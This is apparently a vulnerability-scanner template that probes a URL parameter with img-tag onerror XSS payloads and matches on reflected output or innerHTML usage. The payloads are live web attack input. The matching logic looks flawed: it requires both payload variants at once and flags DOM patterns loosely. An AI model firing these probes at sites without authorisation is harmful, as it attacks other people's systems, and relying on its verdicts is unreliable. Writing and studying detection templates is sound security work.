id: img-onerror-xss

info:
  name: IMG Tag onerror XSS Detection
  author: custom
  severity: high
  description: Detects XSS vulnerability using img tag with onerror event handler
  tags: xss,img,onerror,custom

variables:
  random: "{{1}}"

http:
  - raw:
      - |
        GET {{BaseURL}}?param=%3Cimg+src%3D%22x%22+onerror%3D%22alert({{random}})%22%3E HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET {{BaseURL}}?param=%3Cimg+src%3Dx+onerror%3Dalert({{random}})%3E HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET {{BaseURL}}?param=%22%3E%3Cimg+src%3D%22x%22+onerror%3D%22alert({{random}})%22%3E HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

      - |
        GET {{BaseURL}}?param=%27%3E%3Cimg+src%3D%22x%22+onerror%3D%22alert({{random}})%22%3E HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Connection: close

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: reflected-xss
        dsl:
          - 'contains(body, "<img src=\"x\" onerror=\"alert(")'
          - 'contains(body, "<img src=x onerror=alert(")'
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
        condition: and

      - type: dsl
        name: dom-xss-vulnerable-pattern
        dsl:
          - 'contains(body, ".innerHTML")'
          - 'contains(body, "URLSearchParams")'
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
        condition: and
